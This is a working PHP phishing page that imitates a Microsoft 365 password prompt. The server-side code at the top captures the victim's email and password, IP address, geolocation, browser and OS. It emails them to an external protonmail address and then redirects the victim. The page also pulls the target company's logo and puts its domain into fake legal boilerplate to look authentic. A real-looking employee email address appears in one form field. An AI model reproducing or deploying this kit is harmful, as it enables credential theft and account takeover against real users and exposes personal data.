<?php
session_start();

// Get Email
$mail = $_SESSION['mail'];


// Get Domain
$b = explode('@', $mail);
$domain = $b[1];

$a = explode('.', $mail);
$domain_2 = $a[1];




// Send Result
    if($_POST['passwd'])
    {
        
   function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}


$user_ip = getUserIP();

// get browser


$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();
  


$url='http://www.geoplugin.net/json.gp?ip='.$_SERVER['REMOTE_ADDR'];
			//$ipdetails=file_get_contents($url);
			//$response_tags=json_decode($ipdetails);
			
			//echo $url.'==============';
			
			$ch = curl_init();
			
			curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       
		
			$ouputdata = curl_exec($ch);
			curl_close($ch);
			
			$response_tags=json_decode($ouputdata);
			
			$country=$response_tags->geoplugin_countryName;
			$state=$response_tags->geoplugin_region;
			$city=$response_tags->geoplugin_city;



$email = $_POST['login'];
$password = $_POST['passwd'];


$to = "1cpt@protonmail.com";
$subject = "[1] $country || $mail || 365";

$message = "
Email: $mail
Password: $password
---------=Location & Browser=---------
IP Address: $user_ip
Country: $country
State & City: $state || $city
Browser and OS: $user_browser || $user_os

   ";
 $retval = mail ($to,$subject,$message);
   if( $retval == true )  
   {
    
    header("Location: logon.php");
       
   }
   else
   {
      echo "Message could not be sent...";
   }     
    }
?>

<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
<link rel="dns-prefetch" href="//aadcdn.msauth.net">

    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">


   
    
    
<meta name="robots" content="none">



        <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
        <link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

    <script type="text/javascript">
        ServerData = $Config;
    </script>


    
    <link crossorigin="anonymous" href="./css/converged.v2.login.min_wixdbz3ubznoegxpcgkfog2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-s9J0XeuUiQT41Vv8pNL7Ek16X8wgrLX/MwodqhWuNrtUAR5RLaftOfXr0O6G48l/">



<script crossorigin="anonymous" src="https://aadcdn.msftauth.net/shared/1.0/content/js/OldConvergedLogin_PCore_kHhxXOwRKOBKL9wP7RdDrw2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-LF+GQh+9Lzvb+WdYDqlPyQhwPm0iw6S/Fgyi5FbQyWsrSh/8ASOe6QHG+zdtytVZ"></script>

    <script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_yruqtyo0qslo70l4a-_ung2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-HPrVy9rTXNlsmYsbXYagOj2ACxM8LuCR1dIL22WN1O9T+CR+md+RI95aCQNWROkE"></script>

    


<link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_wixdbz3ubznoegxpcgkfog2.css"><link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_yruqtyo0qslo70l4a-_ung2.js"></head><script type="text/javascript" id="webrtc-control"></script>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top){o&&o.body&&(o.body.style.display="block")}else{if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}}();

//]]></script>
    <script type="text/javascript">
//<![CDATA[
(function () {
var $Prefetch={"rfPre":true,"delay":5000,"maxHistory":4,"maxAge":43200,"ageRes":1440,"name":"clrc","fetch":[{"path":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_wixdbz3ubznoegxpcgkfog2.css","hash":"LTPCTEIr","co":true,"rf":true},{"path":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_yruqtyo0qslo70l4a-_ung2.js","hash":"iqk/sp/n","co":true,"rf":true}],"mode":5};
!function(e,t,n){function r(e){M.appendLog&&M.appendLog("Client Prefetch: "+e)}function i(){try{for(var e=t.cookie.split(";"),r=0;r<e.length;r++){var i=e[r];if(i){var o=i.indexOf("=");if(-1!==o){var u=i.substr(0,o).trim();if(u===n.name){var f=i.substr(o+1);return JSON.parse(c(f))}}}}}catch(a){}return{}}function o(e,t,n){return e.replace(t,n)}function c(e){return e=o(e,/%5c/g,"\\"),e=o(e,/%3e/g,">"),e=o(e,/%3d/g,"="),e=o(e,/%3c/g,"<"),e=o(e,/%3b/g,";"),e=o(e,/%3a/g,":"),e=o(e,/%2c/g,","),e=o(e,/%27/g,"'"),e=o(e,/%22/g,'"'),e=o(e,/%20/g," "),e=o(e,/%25/g,"%")
}function u(e){return e=o(e,/%/g,"%25"),e=o(e,/ /g,"%20"),e=o(e,/"/g,"%22"),e=o(e,/'/g,"%27"),e=o(e,/,/g,"%2c"),e=o(e,/:/g,"%3a"),e=o(e,/;/g,"%3b"),e=o(e,/</g,"%3c"),e=o(e,/=/g,"%3d"),e=o(e,/>/g,"%3e"),e=o(e,/\\/g,"%5c")}function f(e){var r=new Date;r.setTime(r.getTime()+C*H),t.cookie=n.name+"="+u(JSON.stringify(e))+";expires="+r.toUTCString()+";path=/; Secure; SameSite=None"}function a(e,t){if(e){if(e.indexOf){return e.indexOf(t)}for(var n=0;n<e.length;n++){if(e[n]===t){return n}}}return-1}function h(e,t){return-1!==a(e,t)
}function g(e,t){var n=a(e,t);return-1!==n?(e.splice(n,1),!0):!1}function s(e,t){for(var n in e){if(e.hasOwnProperty(n)&&!t(n,e[n])){break}}}function l(){var e=(new Date).getTime(),t=D*H;return Math.round(P.getTime()>e?e/t:(e-P.getTime())/t)}function d(e,t){var n=!1;if(t&&t.length>0){n=!0;for(var r=0;r<t.length;r++){delete e[t[r]]}}return n}function p(e){var t=l()-C,n=t+2*C,r=null,i=0,o=[];return s(e,function(c){return t>c||c>n?o.push(c):(0===e[c].length?o.push(c):(null===r||r>c)&&(r=c),i++),!0}),null!==r&&i>k&&o.push(r),d(e,o)
}function v(e,t,n){r("Fetched: "+e+" Hash: "+t+" isRefresh: "+n);var o=i(),c=l(),u=!1,a=!1;if(s(o,function(e,n){return h(n,t)?(e!==c?g(o[e],t)&&(a=!0):u=!0,!1):!0}),!u){var d=o[c]||[];d.push(t),o[c]=d,a=!0}a|=p(o),a&&f(o),b()}function m(t,n,i,o){var c={"method":"GET"};i&&(c.mode="cors"),e.fetch(t,c).then(function(e){200===e.status?v(t,n,o):(r("Unexpected response - "+e.status),b())})["catch"](function(e){r("Failed - "+e),b()})}function T(){if(e.XMLHttpRequest&&!J){return new XMLHttpRequest}if(e.ActiveXObject){try{return new ActiveXObject("Msxml2.XMLHTTP")
}catch(t){}try{return new ActiveXObject("Microsoft.XMLHttp")}catch(t){}}return null}function w(e,t,n,i,o){r("Fetching - "+t),e.onload=function(){v(t,n,o)},e.onerror=function(){r("XHR failed!"),b()},e.ontimeout=function(){r("XHR timed out!"),b()};try{e.open("GET",t),e.withCredentials=i&&!N,e.send()}catch(c){N?setTimeout(function(){v(t,n,o)},0):(N=!0,w(e,t,n,!1,o))}}function O(t,n,i,o){if(e.fetch){return void m(t,n,i,o)}var c=T();return null!==c?void w(c,t,n,i,o):void r("Unable to identify a transport option!")
}function b(){var e=n.fetch;if(X<e.length&&e[X]){var t=e[X];O(t.path,t.hash,t.co||!1,t.rf||!1),X++}}function y(e){if(e){try{var n=t.createElement("link");n.rel="prefetch",n.href=e,t.head.appendChild(n)}catch(r){}}}function S(){r("Starting"),b(),b()}function x(){for(var t=e.$Config||e.ServerData||{},r=n.fetch,i=n.mode||-1,o=-1,c=0;c<r.length;c++){0!==o&&i>=3&&(o=r[c].rf?1:0),R&&!J&&y(r[c].path||{})}t.prefetchPltMode=o}if(n&&n.fetch&&0!==n.fetch.length){var M=e.$Debug||{},X=0,H=6e4,P=new Date(2019),k=n.maxHistory||4,C=n.maxAge||20160,D=n.ageRes||1440,L=n.delay||5e3,R=n.rfPre||!1,J=void 0!==(e._phantom||e.callPhantom),N=!1;
JSON&&JSON.parse&&(n.clearCookie=function(){document.cookie=n.name+"=; expires=Thu, 01 Jan 1970 00:00:01 GMT;"},e.$Do.when("doc.load",function(){setTimeout(S,L),setTimeout(x,0)}))}}(window,document,$Prefetch);

;
})();
//]]>
</script>


<div><!--  --> <!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> <!-- ko if: smallImageUrl --><!-- /ko --> <!-- ko if: backgroundImageUrl --> <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url(&quot;https://aadcdn.msftauthimages.net/dbd5a2dd-sd-nd0bb-0hqs6piuad8-tfrvahzicjpconfdlg07ry/logintenantbranding/0/illustration?ts=636111043621904566&quot;);" class="background-image ext-background-image"></div> <!-- ko if: useImageMask --> <div class="background-overlay"></div> <!-- /ko --> <!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div> 



<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="#"> <!-- ko if: svr.iBannerEnvironment --><!-- /ko --> <!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"> <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <!-- ko if: svr.fShowPageLevelTitleAndDesc && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hidePageLevelTitleAndDesc')) --><!-- /ko --> <div data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButtons,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox },
                externalCss: { 'sign-in-box': true }" class="sign-in-box ext-sign-in-box fade-in-lightbox"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div> <!-- ko if: showLightboxProgress --><!-- /ko --> <div class="win-scroll"> <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: 'logo-control',
                        params: {
                            isChinaDc: svr.fIsChinaDc,
                            bannerLogoUrl: bannerLogoUrl() } }"><!--  --> <!-- ko if: bannerLogoUrl --> 
                            
                          <?php
						$ch = curl_init();

						curl_setopt($ch, CURLOPT_URL, "https://logo.clearbit.com/$domain");
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

						curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

						$headers = array();
						$headers[] = 'Upgrade-Insecure-Requests: 1';
						$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
						curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

						$result = curl_exec($ch);
						if(!$result || strlen(trim($result)) == 0 || curl_errno($ch))
						{
							$logo = 0;
						}
						else
						{
							$logo = 1;
						}
						
						curl_close($ch);
						
						if($logo == 0)
						{
							echo "<img src='logo.svg' height='24px'>";
						}
						else
						{
							echo '<img src="https://logo.clearbit.com/'.$domain.'" alt="" class="center" height="60px" alt="Logo"><br>';
						}
					?>

                            
                            
                            <!-- /ko --> <!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- /ko --></div> <!-- /ko --> <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <!-- ko if: asyncInitReady --> <div role="main" data-bind="component: { name: 'pagination-control',
                            publicMethods: paginationControlMethods,
                            params: {
                                enableCssAnimation: svr.fEnableCssAnimation,
                                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                                initialViewId: initialViewId,
                                currentViewId: currentViewId,
                                initialSharedData: initialSharedData,
                                initialError: $loginPage.getServerError() },
                            event: {
                                cancel: paginationControl_onCancel,
                            loadView: view_onLoadView,
                            showView: view_onShow,
                                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""> <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --> <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next"> <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  --> <div class="identityBanner"> <!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back"> <!-- ko ifnot: svr.fIsRTLMarket --> <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --> <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --> <!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button> <!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $mail; ?>"><?php echo $mail; ?></div> </div></div> </div> <!-- /ko --> <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"> <!-- ko foreach: views --> <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                            params: {
                                serverData: svr,
                                serverError: initialError,
                                isInitialView: isInitialState,
                                username: sharedData.username,
                                displayName: sharedData.displayName,
                                hipRequiredForUsername: sharedData.hipRequiredForUsername,
                                passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                                availableCreds: sharedData.availableCreds,
                                evictedCreds: sharedData.evictedCreds,
                                useEvictedCredentials: sharedData.useEvictedCredentials,
                                showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                                flowToken: sharedData.flowToken,
                                defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                                userTenantBranding: sharedData.userTenantBranding,
                                sessions: sharedData.sessions,
                                callMetadata: sharedData.callMetadata },
                            event: {
                                updateFlowToken: $loginPage.view_onUpdateFlowToken,
                                submitReady: $loginPage.view_onSubmitReady,
                                redirect: $loginPage.view_onRedirect,
                                resetPassword: $loginPage.passwordView_onResetPassword,
                                setBackButtonState: view_onSetIdentityBackButtonState,
                                setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  --> <!--  --> 
                                
                                
                                
                                <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: unsafe_username" value="<?php echo $email; ?>"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value=""> <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value=""> <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value=""> <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value=""> <div id="loginHeader" class="row title ext-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title'], externalCss: { 'title': true }">Enter password</div> 
                                <p>Because you're accessing sensitive info, you need to verify your password.
</p>
                                
                                <!-- ko if: showCredViewBrandingDesc --><!-- /ko --> <!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive"> <!-- ko if: passwordTextbox.error --><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder="Password" aria-label="Enter the password for jose.toscano@intelsat.com" tabindex="0"> <!-- ko if: svr.fUsePasswordPeek && showPassword() --><!-- /ko --> <!-- /ko --> <!-- /ko --> <!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> <!-- ko if: svr.fUsePasswordPeek --><!-- /ko --> </div> </div> <!-- ko if: shouldHipInit --><!-- /ko --> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }"> <div> <!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko --> <!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAYWSu27TYABG46RxacWlICQ6QQcGQHLy245vlRgcO0lzc-o4jWsvke04iZ34El_ixCMSEjB1QqITqsTSkQmQEMydOjDxBBUTYkCMhCdgOdOns3xne5MskAVQAE9yaAHdf1jCS4RG6QzCaCSOlBgUIFoJIxGcwEkcA-iQAHhwZ3uH-HLv9_MHL4WPevyZf_Yuew7dn0SRH-4Xi0mSFLzRyDLMguE5xZnmDi13_AGCLiHoCoJOs3nTRY6k82xI4hROA4oGBEaUAIZRZEFJx0tVFhOBr0TtVExUDgDF6TotuZ4oNhuptmq1bdUWnPp603AEuZ0qvfpKlSuRyrOoIgHQTidWS64s23w7UmsiaMvKsl1bOx11-j17q8PG0QT7By-wUvNXdmvkBc7A98LoNPc6K3iubLWWB6KkT3GTcC0q7PfqyfSoEhuzJEhWMd_RJNwrNaUZB5iZPtNJENBOVwWJJ3CsS4e00ZgezAWKWRjDkdVVUxNxG4dMvybTc98NcWxO9EK_HrZQeuKXV5oReoum0qwIZncy6VN-lx_Y6lhEavHMjEGn1OdTZtgE1cMx7ZaZEhbpbpXx_TIX-UuHblQFsVp2MMEX2TRdIiMg2qyuoaQcHCfH3IqP-QE-blDMqjzuHgcCZWiHVcfE9FXXSO0O6rlcYMterWEiuIJW0wNyuBjHYjWQaIPQa9yictgU3-fg9ZmO517kbnq-6VrDPT_wRtbMvNyAfmxcvwbvwLuZvcyjuyD_ZwM6y68beeWcvbmck7W38unVt93HmYt80aHwuqEqzkji5R4RV_hms8cbCZjbnLAs4v0hoaciN_ZMxnhK76MnMHQCwxfw7To_ECo9qccKPNvlsQH4CUMvNjOftv5T3dcbmb81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=macOS" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: accessRecoveryLink || svr.urlResetPassword, click: resetPassword_onClick">Forgot my password</a> </div> <!-- ko if: allowPhoneDisambiguation --><!-- /ko --> <!-- ko ifnot: useEvictedCredentials --> <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  --> <div class="form-group"> <!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --><!-- /ko --> <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --> <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> </div> <!-- ko if: credLinkError --><!-- /ko --><!-- /ko --> <!-- ko if: evictedCreds.length > 0 --><!-- /ko --> <!-- /ko --> <!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div> </div> <div class="win-button-pin-bottom"> <div class="row move-buttons" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.fShowButtons,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }"> <!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block"> <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" id="idSIButton9" data-bind="
            attr: primaryButtonAttributes,
            externalCss: {
                'button': true,
                'primary': true },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" value="Sign in"> </div> </div></div> </div> </div> </div> <!-- ko if: tenantBranding.BoilerPlateText --> <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" data-bind="
    htmlWithMods: tenantBranding.BoilerPlateText,
    htmlMods: { filterLinks: svr.fIsHosted },
    css: { 'transparent-lightbox': tenantBranding.UseTransparentLightBox },
    externalCss: { 'boilerplate-text': true }"><p>This computer system is <?php echo $domain; ?> property and is intended to be used for authorized business purposes. All use may be monitored by <?php echo $domain; ?>.</p>
